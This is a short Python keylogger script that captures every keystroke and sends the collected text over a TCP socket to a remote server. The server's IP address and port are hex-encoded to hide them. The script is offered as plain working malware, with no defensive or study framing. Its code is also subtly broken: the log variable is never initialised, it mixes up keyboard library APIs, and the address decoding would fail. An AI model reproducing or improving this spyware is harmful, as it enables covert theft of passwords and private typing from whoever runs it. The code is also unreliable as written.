import keyboard
import socket
import os

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += str(key)


def send_logs():
    global log
    if log:
        server_ip = ''.join(chr(int('0x' + x, 16)) for x in '3139322e3136382e3132322e313832'.split('.'))
        port = int('0x2328', 16)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, port))
            s.sendall(log.encode())
        log = ""


def write_file(data):
    with open("keylogs.txt", "a") as f:
        f.write(data)

with keyboard.Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        send_logs()

send_logs()